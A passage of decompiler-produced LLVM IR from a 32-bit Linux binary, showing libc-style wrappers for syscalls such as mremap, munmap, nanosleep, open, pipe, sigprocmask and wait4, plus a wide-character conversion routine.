  %v1_804fc45 = sub i32 0, %v0_804fc45
  %v2_804fc47 = inttoptr i32 %v1_804fc40 to i32*
  store i32 %v1_804fc45, i32* %v2_804fc47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc4c

dec_label_pc_804fc4c:                             ; preds = %dec_label_pc_804fc20, %dec_label_pc_804fc40
  %v0_804fc4d = phi i32 [ %v1_804fc33, %dec_label_pc_804fc20 ], [ -1, %dec_label_pc_804fc40 ]
  %v2_804fc50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc50, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fc4d

; uselistorder directives
  uselistorder i32 %v1_804fc33, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_804fc4c, { 1, 0 }
}

define i32 @function_804fc54() local_unnamed_addr {
dec_label_pc_804fc54:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc54 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc54, i32* %stack_var_-4, align 4
  %v1_804fc5d = call i32 @int80_syscall(i32 199)
  store i32 %v1_804fc5d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fc5d, -4095
  br i1 %tmp, label %dec_label_pc_804fc74, label %dec_label_pc_804fc68

dec_label_pc_804fc68:                             ; preds = %dec_label_pc_804fc54
  %v0_804fc68 = load i32, i32* %stack_var_-4, align 4
  %v1_804fc68 = call i32 @function_804baa4(i32 %v0_804fc68)
  %v0_804fc6d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc6d = sub i32 0, %v0_804fc6d
  %v2_804fc6f = inttoptr i32 %v1_804fc68 to i32*
  store i32 %v1_804fc6d, i32* %v2_804fc6f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc74

dec_label_pc_804fc74:                             ; preds = %dec_label_pc_804fc54, %dec_label_pc_804fc68
  %v0_804fc75 = phi i32 [ %v1_804fc5d, %dec_label_pc_804fc54 ], [ -1, %dec_label_pc_804fc68 ]
  %v2_804fc78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc78, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fc75

; uselistorder directives
  uselistorder i32 %v1_804fc5d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc74, { 1, 0 }
}

define i32 @function_804fc7c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_804fc7c:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fc7d = load i32, i32* @esi, align 4
  store i32 %v0_804fc7d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fc95 = load i32, i32* @ebx, align 4
  %v5_804fc9d = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_804fc9d = ptrtoint i32* %v5_804fc9d to i32
  store i32 %v0_804fc95, i32* @ebx, align 4
  store i32 %v6_804fc9d, i32* %esi.global-to-local, align 4
  %tmp = icmp ugt i32* %v5_804fc9d, inttoptr (i32 -4096 to i32*)
  br i1 %tmp, label %dec_label_pc_804fca9, label %dec_label_pc_804fcb5

dec_label_pc_804fca9:                             ; preds = %dec_label_pc_804fc7c
  %v1_804fca9 = call i32 @function_804baa4(i32 %v0_804fc95)
  %v0_804fcae = load i32, i32* %esi.global-to-local, align 4
  %v1_804fcae = sub i32 0, %v0_804fcae
  %v2_804fcb0 = inttoptr i32 %v1_804fca9 to i32*
  store i32 %v1_804fcae, i32* %v2_804fcb0, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fcb5

dec_label_pc_804fcb5:                             ; preds = %dec_label_pc_804fc7c, %dec_label_pc_804fca9
  %v0_804fcb6 = phi i32 [ %v6_804fc9d, %dec_label_pc_804fc7c ], [ -1, %dec_label_pc_804fca9 ]
  %v2_804fcb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fcb8, i32* @esi, align 4
  ret i32 %v0_804fcb6

; uselistorder directives
  uselistorder i32 %v0_804fc95, { 1, 0 }
  uselistorder label %dec_label_pc_804fcb5, { 1, 0 }
}

define i32 @function_804fcbc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fcbc:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcbc = load i32, i32* @ebx, align 4
  store i32 %v0_804fcbc, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_804fccf = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_804fccf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804fccf, -4095
  br i1 %tmp, label %dec_label_pc_804fce8, label %dec_label_pc_804fcdc

dec_label_pc_804fcdc:                             ; preds = %dec_label_pc_804fcbc
  %v0_804fcdc = load i32, i32* %stack_var_-4, align 4
  %v1_804fcdc = call i32 @function_804baa4(i32 %v0_804fcdc)
  %v0_804fce1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fce1 = sub i32 0, %v0_804fce1
  %v2_804fce3 = inttoptr i32 %v1_804fcdc to i32*
  store i32 %v1_804fce1, i32* %v2_804fce3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fce8

dec_label_pc_804fce8:                             ; preds = %dec_label_pc_804fcbc, %dec_label_pc_804fcdc
  %v0_804fce9 = phi i32 [ %v3_804fccf, %dec_label_pc_804fcbc ], [ -1, %dec_label_pc_804fcdc ]
  %v2_804fce8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fce8, i32* @edx, align 4
  %v2_804fcec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fcec, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fce9

; uselistorder directives
  uselistorder i32 %v3_804fccf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fce8, { 1, 0 }
}

define i32 @function_804fcf0(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fcf0:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_804fcf0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fcf0, i32* %stack_var_-4, align 4
  %v4_804fcf4 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804fcf4, i32* %ebx.global-to-local, align 4
  %v6_804fd03 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_804fd03, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_804fd03, -4095
  br i1 %tmp, label %dec_label_pc_804fd1c, label %dec_label_pc_804fd10

dec_label_pc_804fd10:                             ; preds = %dec_label_pc_804fcf0
  %v0_804fd10 = load i32, i32* %stack_var_-4, align 4
  %v1_804fd10 = call i32 @function_804baa4(i32 %v0_804fd10)
  %v0_804fd15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fd15 = sub i32 0, %v0_804fd15
  %v2_804fd17 = inttoptr i32 %v1_804fd10 to i32*
  store i32 %v1_804fd15, i32* %v2_804fd17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd1c

dec_label_pc_804fd1c:                             ; preds = %dec_label_pc_804fcf0, %dec_label_pc_804fd10
  %v0_804fd1d = phi i32 [ %v6_804fd03, %dec_label_pc_804fcf0 ], [ -1, %dec_label_pc_804fd10 ]
  %v2_804fd20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fd20, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fd1d

; uselistorder directives
  uselistorder i32 %v6_804fd03, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fd1c, { 1, 0 }
}

define i32 @function_804fd24(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fd24:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804fd27 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804fd2b = sdiv i32 %sext, 16777216
  store i32 %v4_804fd2b, i32* @ecx, align 4
  %v4_804fd2f = ptrtoint i8* %arg1 to i32
  %v3_804fd33 = and i32 %arg2, 64
  %v4_804fd33 = icmp eq i32 %v3_804fd33, 0
  br i1 %v4_804fd33, label %dec_label_pc_804fd44, label %dec_label_pc_804fd38

dec_label_pc_804fd38:                             ; preds = %dec_label_pc_804fd24
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804fd44

dec_label_pc_804fd44:                             ; preds = %dec_label_pc_804fd24, %dec_label_pc_804fd38
  %v0_804fd44 = phi i32 [ 0, %dec_label_pc_804fd24 ], [ %phitmp, %dec_label_pc_804fd38 ]
  store i32 %v0_804fd44, i32* @edx, align 4
  store i32 %v4_804fd2f, i32* %ebx.global-to-local, align 4
  %v5_804fd4f = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804fd2b)
  store i32 %v5_804fd4f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804fd4f, -4095
  br i1 %tmp, label %dec_label_pc_804fd67, label %dec_label_pc_804fd5b

dec_label_pc_804fd5b:                             ; preds = %dec_label_pc_804fd44
  %v1_804fd5b = call i32 @function_804baa4(i32 %v0_804fd27)
  %v0_804fd60 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fd60 = sub i32 0, %v0_804fd60
  %v2_804fd62 = inttoptr i32 %v1_804fd5b to i32*
  store i32 %v1_804fd60, i32* %v2_804fd62, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd67

dec_label_pc_804fd67:                             ; preds = %dec_label_pc_804fd44, %dec_label_pc_804fd5b
  %v0_804fd6a = phi i32 [ %v5_804fd4f, %dec_label_pc_804fd44 ], [ -1, %dec_label_pc_804fd5b ]
  store i32 %v0_804fd27, i32* @ebx, align 4
  ret i32 %v0_804fd6a

; uselistorder directives
  uselistorder i32 %v5_804fd4f, { 1, 0, 2 }
  uselistorder i32 %v4_804fd2b, { 1, 0 }
  uselistorder i32 %v0_804fd27, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804fd67, { 1, 0 }
  uselistorder label %dec_label_pc_804fd44, { 1, 0 }
}

define i32 @function_804fd6f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fd6f:
  %v3_804fd7f = inttoptr i32 %arg1 to i8*
  %v4_804fd7f = call i32 @function_804fd24(i8* %v3_804fd7f, i32 577, i32 %arg2)
  ret i32 %v4_804fd7f

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @function_804fd24, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
}

define i32 @function_804fd88(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fd88:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd88 = load i32, i32* @edi, align 4
  store i32 %v0_804fd88, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fd90 = load i32, i32* @ebx, align 4
  %v1_804fd98 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804fd98 = call i32 @pipe([2 x i32] %v1_804fd98)
  store i32 %v0_804fd90, i32* @ebx, align 4
  store i32 %v2_804fd98, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804fd98, -4095
  br i1 %tmp, label %dec_label_pc_804fdb0, label %dec_label_pc_804fda4

dec_label_pc_804fda4:                             ; preds = %dec_label_pc_804fd88
  %v1_804fda4 = call i32 @function_804baa4(i32 %v0_804fd90)
  %v0_804fda9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fda9 = sub i32 0, %v0_804fda9
  %v2_804fdab = inttoptr i32 %v1_804fda4 to i32*
  store i32 %v1_804fda9, i32* %v2_804fdab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fdb0

dec_label_pc_804fdb0:                             ; preds = %dec_label_pc_804fd88, %dec_label_pc_804fda4
  %v0_804fdb1 = phi i32 [ %v2_804fd98, %dec_label_pc_804fd88 ], [ -1, %dec_label_pc_804fda4 ]
  %v2_804fdb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fdb4, i32* @edi, align 4
  ret i32 %v0_804fdb1

; uselistorder directives
  uselistorder i32 %v2_804fd98, { 1, 0, 2 }
  uselistorder i32 %v0_804fd90, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fdb0, { 1, 0 }
}

define i32 @function_804fdb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fdb8:
  %stack_var_-12 = alloca i32, align 4
  %v0_804fdb9 = load i32, i32* @ebx, align 4
  %v0_804fdbd = load i32, i32* @global_var_8058b44.184, align 4
  %v1_804fdbd = icmp eq i32 %v0_804fdbd, 0
  %v1_804fdc8 = icmp eq i1 %v1_804fdbd, false
  br i1 %v1_804fdc8, label %dec_label_pc_804fddb, label %dec_label_pc_804fdca

dec_label_pc_804fdca:                             ; preds = %dec_label_pc_804fdb8
  %v1_804fdcf = call i32 @function_805168c(i32 0)
  %v2_804fdd7 = icmp slt i32 %v1_804fdcf, 0
  br i1 %v2_804fdd7, label %dec_label_pc_804fdfd, label %dec_label_pc_804fdca.dec_label_pc_804fddb_crit_edge

dec_label_pc_804fdca.dec_label_pc_804fddb_crit_edge: ; preds = %dec_label_pc_804fdca
  %v0_804fddd.pre = load i32, i32* @global_var_8058b44.184, align 4
  br label %dec_label_pc_804fddb

dec_label_pc_804fddb:                             ; preds = %dec_label_pc_804fdca.dec_label_pc_804fddb_crit_edge, %dec_label_pc_804fdb8
  %v0_804fdeb = phi i32 [ %v0_804fddd.pre, %dec_label_pc_804fdca.dec_label_pc_804fddb_crit_edge ], [ %v0_804fdbd, %dec_label_pc_804fdb8 ]
  %v1_804fddb = icmp eq i32 %arg1, 0
  %v1_804fde2 = icmp eq i1 %v1_804fddb, false
  br i1 %v1_804fde2, label %dec_label_pc_804fde8, label %dec_label_pc_804fde4

dec_label_pc_804fde4:                             ; preds = %dec_label_pc_804fddb
  br label %dec_label_pc_804fe00

dec_label_pc_804fde8:                             ; preds = %dec_label_pc_804fddb
  store i32 %v0_804fdeb, i32* @ebx, align 4
  %v2_804fded = add i32 %v0_804fdeb, %arg1
  %v1_804fdf1 = call i32 @function_805168c(i32 %v2_804fded)
  %v2_804fdf9 = icmp slt i32 %v1_804fdf1, 0
  %v1_804fdfb = icmp eq i1 %v2_804fdf9, false
  br i1 %v1_804fdfb, label %dec_label_pc_804fde8.dec_label_pc_804fe00_crit_edge, label %dec_label_pc_804fdfd

dec_label_pc_804fde8.dec_label_pc_804fe00_crit_edge: ; preds = %dec_label_pc_804fde8
  %v0_804fe01.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fe00

dec_label_pc_804fdfd:                             ; preds = %dec_label_pc_804fde8, %dec_label_pc_804fdca
  br label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %dec_label_pc_804fde8.dec_label_pc_804fe00_crit_edge, %dec_label_pc_804fde4, %dec_label_pc_804fdfd
  %v0_804fe01 = phi i32 [ %v0_804fe01.pre, %dec_label_pc_804fde8.dec_label_pc_804fe00_crit_edge ], [ %v0_804fdeb, %dec_label_pc_804fde4 ], [ -1, %dec_label_pc_804fdfd ]
  %v2_804fe00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe00, i32* @edx, align 4
  store i32 %v0_804fdb9, i32* @ebx, align 4
  ret i32 %v0_804fe01

; uselistorder directives
  uselistorder i32 %v0_804fdeb, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805168c, { 1, 0 }
  uselistorder label %dec_label_pc_804fe00, { 2, 0, 1 }
}

define i32 @function_804fe08(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fe08:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804fe09 = load i32, i32* @esi, align 4
  %v4_804fe0d = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804fe0d, i32* @ecx, align 4
  %v2_804fe19 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804fe19, label %dec_label_pc_804fe32, label %dec_label_pc_804fe1d

dec_label_pc_804fe1d:                             ; preds = %dec_label_pc_804fe08
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804fe32, label %dec_label_pc_804fe22

dec_label_pc_804fe22:                             ; preds = %dec_label_pc_804fe1d
  %v1_804fe22 = call i32 @function_804baa4(i32 %v0_804fe09)
  %v1_804fe27 = inttoptr i32 %v1_804fe22 to i32*
  store i32 22, i32* %v1_804fe27, align 4
  br label %dec_label_pc_804fe59

dec_label_pc_804fe32:                             ; preds = %dec_label_pc_804fe1d, %dec_label_pc_804fe08
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804fe37 = load i32, i32* @ebx, align 4
  %v7_804fe3f = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804fe37, i32* @ebx, align 4
  store i32 %v7_804fe3f, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804fe3f, -4095
  br i1 %tmp11, label %dec_label_pc_804fe59, label %dec_label_pc_804fe4b

dec_label_pc_804fe4b:                             ; preds = %dec_label_pc_804fe32
  %v1_804fe4b = call i32 @function_804baa4(i32 %v0_804fe37)
  %v0_804fe50 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe50 = sub i32 0, %v0_804fe50
  %v2_804fe52 = inttoptr i32 %v1_804fe4b to i32*
  store i32 %v1_804fe50, i32* %v2_804fe52, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe59

dec_label_pc_804fe59:                             ; preds = %dec_label_pc_804fe4b, %dec_label_pc_804fe32, %dec_label_pc_804fe22
  %storemerge = phi i32 [ -1, %dec_label_pc_804fe22 ], [ %v7_804fe3f, %dec_label_pc_804fe32 ], [ -1, %dec_label_pc_804fe4b ]
  %v2_804fe59 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe59, i32* @edx, align 4
  store i32 %v0_804fe09, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804fe3f, { 1, 0, 2 }
  uselistorder i32 %v0_804fe37, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804fe60(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4) local_unnamed_addr {
dec_label_pc_804fe60:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fe61 = load i32, i32* @esi, align 4
  store i32 %v0_804fe61, i32* %stack_var_-8, align 4
  %v4_804fe71 = ptrtoint %rusage* %arg4 to i32
  store i32 %v4_804fe71, i32* %esi.global-to-local, align 4
  %v0_804fe75 = load i32, i32* @ebx, align 4
  %v6_804fe7d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* %arg4)
  store i32 %v0_804fe75, i32* @ebx, align 4
  store i32 %v6_804fe7d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v6_804fe7d, -4095
  br i1 %tmp, label %dec_label_pc_804fe95, label %dec_label_pc_804fe89

dec_label_pc_804fe89:                             ; preds = %dec_label_pc_804fe60
  %v1_804fe89 = call i32 @function_804baa4(i32 %v0_804fe75)
  %v0_804fe8e = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe8e = sub i32 0, %v0_804fe8e
  %v2_804fe90 = inttoptr i32 %v1_804fe89 to i32*
  store i32 %v1_804fe8e, i32* %v2_804fe90, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe95

dec_label_pc_804fe95:                             ; preds = %dec_label_pc_804fe60, %dec_label_pc_804fe89
  %v0_804fe96 = phi i32 [ %v6_804fe7d, %dec_label_pc_804fe60 ], [ -1, %dec_label_pc_804fe89 ]
  %v2_804fe98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fe98, i32* @esi, align 4
  ret i32 %v0_804fe96

; uselistorder directives
  uselistorder i32 %v6_804fe7d, { 1, 0, 2 }
  uselistorder i32 %v0_804fe75, { 1, 0 }
  uselistorder label %dec_label_pc_804fe95, { 1, 0 }
}

define i32 @function_804fe9c() local_unnamed_addr {
dec_label_pc_804fe9c:
  ret i32 ptrtoint (i32* @global_var_8058b24.185 to i32)
}

define i32 @function_804fea4() local_unnamed_addr {
dec_label_pc_804fea4:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804feaf = icmp eq i32 %tmp4, 0
  %v1_804feb1 = icmp eq i1 %v1_804feaf, false
  br i1 %v1_804feb1, label %dec_label_pc_804feb9, label %dec_label_pc_804feb3

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fea4
  %v2_804feb3 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804feb9

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804fea4, %dec_label_pc_804feb3
  %v0_804fed5 = phi i32 [ %tmp4, %dec_label_pc_804fea4 ], [ %v2_804feb3, %dec_label_pc_804feb3 ]
  %v0_804fec1 = phi i32 [ %tmp3, %dec_label_pc_804fea4 ], [ 0, %dec_label_pc_804feb3 ]
  %v2_804feb9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_804feb9, i32* %stack_var_-8, align 4
  store i32 %v0_804fec1, i32* %stack_var_-4, align 4
  %v2_804fed0 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804fed6 = inttoptr i32 %v0_804fed5 to i8*
  %v6_804fed6 = call i32 @function_804ff0c(i8* %v5_804fed6, i32 %v2_804fed0, i32 1, i32 16, i32 %tmp)
  %v1_804fee0 = icmp eq i32 %v6_804fed6, 0
  %v3_804fee2 = select i1 %v1_804fee0, i32 1, i32 %v6_804fed6
  ret i32 %v3_804fee2

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804feb9, { 1, 0 }
}

define i32 @function_804feec() local_unnamed_addr {
dec_label_pc_804feec:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804ff01 = inttoptr i32 %tmp to i8*
  %v6_804ff01 = call i32 @function_804ff0c(i8* %v5_804ff01, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804ff01
}

define i32 @function_804ff0c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804ff0c:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_804ff0f = load i32, i32* @ebx, align 4
  %v4_804ff13 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ff13, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804ff23 = icmp eq i8* %arg1, null
  store i1 %v1_804ff23, i1* %zf.global-to-local, align 1
  br i1 %v1_804ff23, label %dec_label_pc_804ff32, label %dec_label_pc_804ff27

dec_label_pc_804ff27:                             ; preds = %dec_label_pc_804ff0c
  %v12_804ff27 = icmp eq i32 %v4_804ff13, %arg2
  store i1 %v12_804ff27, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_804ff2e = icmp eq i1 %v12_804ff27, false
  br i1 %v1_804ff2e, label %dec_label_pc_804ff55, label %dec_label_pc_804ff4f

dec_label_pc_804ff32:                             ; preds = %dec_label_pc_804ff0c
  %v2_804ff32 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ff32, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804ff53

dec_label_pc_804ff3b:                             ; preds = %dec_label_pc_804ff63
  %v1_804ff3b = call i32 @function_804baa4(i32 %v0_804ff0f)
  %v1_804ff40 = inttoptr i32 %v1_804ff3b to i32*
  store i32 84, i32* %v1_804ff40, align 4
  br label %dec_label_pc_804ff89

dec_label_pc_804ff4b:                             ; preds = %dec_label_pc_804ff6a
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804ff7e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ff7a

dec_label_pc_804ff4f:                             ; preds = %dec_label_pc_804ff27
  %v2_804ff4f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ff4f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ff53

dec_label_pc_804ff53:                             ; preds = %dec_label_pc_804ff32, %dec_label_pc_804ff4f
  %v2_804ff6c17 = phi i32 [ %v2_804ff32, %dec_label_pc_804ff32 ], [ %v2_804ff4f, %dec_label_pc_804ff4f ]
  %v1_804ff5813 = phi i32 [ -1, %dec_label_pc_804ff32 ], [ %arg4, %dec_label_pc_804ff4f ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ff55

dec_label_pc_804ff55:                             ; preds = %dec_label_pc_804ff27, %dec_label_pc_804ff53
  %v2_804ff6c16 = phi i32 [ %v4_804ff13, %dec_label_pc_804ff27 ], [ %v2_804ff6c17, %dec_label_pc_804ff53 ]
  %v0_804ff5a = phi i32 [ %arg4, %dec_label_pc_804ff27 ], [ %v1_804ff5813, %dec_label_pc_804ff53 ]
  %v1_804ff55 = inttoptr i32 %arg2 to i32*
  %v2_804ff55 = load i32, i32* %v1_804ff55, align 4
  store i32 %v2_804ff55, i32* %ebx.global-to-local, align 4
  %tmp32 = icmp uge i32 %v0_804ff5a, %arg3
  %v5_804ff5c = select i1 %tmp32, i32 %arg3, i32 %v0_804ff5a
  store i32 %v5_804ff5c, i32* %edi.global-to-local, align 4
  store i32 %v5_804ff5c, i32* @ecx, align 4
  %v1_804ff764 = icmp eq i32 %v5_804ff5c, 0
  store i1 %v1_804ff764, i1* %zf.global-to-local, align 1
  %v1_804ff7811 = icmp eq i1 %v1_804ff764, false
  br i1 %v1_804ff7811, label %dec_label_pc_804ff63, label %dec_label_pc_804ff7a

dec_label_pc_804ff63:                             ; preds = %dec_label_pc_804ff55, %dec_label_pc_804ff70
  %v2_804ff6c = phi i32 [ %v2_804ff73, %dec_label_pc_804ff70 ], [ %v2_804ff6c16, %dec_label_pc_804ff55 ]
  %v0_804ff63 = phi i32 [ %v1_804ff70, %dec_label_pc_804ff70 ], [ %v2_804ff55, %dec_label_pc_804ff55 ]
  %v1_804ff63 = inttoptr i32 %v0_804ff63 to i32*
  %v2_804ff63 = load i32, i32* %v1_804ff63, align 4
  %v9_804ff65 = icmp eq i32 %v2_804ff63, 127
  store i1 %v9_804ff65, i1* %zf.global-to-local, align 1
  %v6_804ff68 = icmp ugt i32 %v2_804ff63, 127
  br i1 %v6_804ff68, label %dec_label_pc_804ff3b, label %dec_label_pc_804ff6a

dec_label_pc_804ff6a:                             ; preds = %dec_label_pc_804ff63
  %v3_804ff6a = trunc i32 %v2_804ff63 to i8
  %v4_804ff6a = icmp eq i8 %v3_804ff6a, 0
  store i1 %v4_804ff6a, i1* %zf.global-to-local, align 1
  %v3_804ff6c = inttoptr i32 %v2_804ff6c to i8*
  store i8 %v3_804ff6a, i8* %v3_804ff6c, align 1
  %v0_804ff6e = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804ff6e, label %dec_label_pc_804ff4b, label %dec_label_pc_804ff70

dec_label_pc_804ff70:                             ; preds = %dec_label_pc_804ff6a
  %v0_804ff70 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ff70 = add i32 %v0_804ff70, 4
  store i32 %v1_804ff70, i32* %ebx.global-to-local, align 4
  %v0_804ff73 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ff73 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ff73 = add i32 %v1_804ff73, %v0_804ff73
  store i32 %v2_804ff73, i32* %edx.global-to-local, align 4
  %v0_804ff75 = load i32, i32* @ecx, align 4
  %v1_804ff75 = add i32 %v0_804ff75, -1
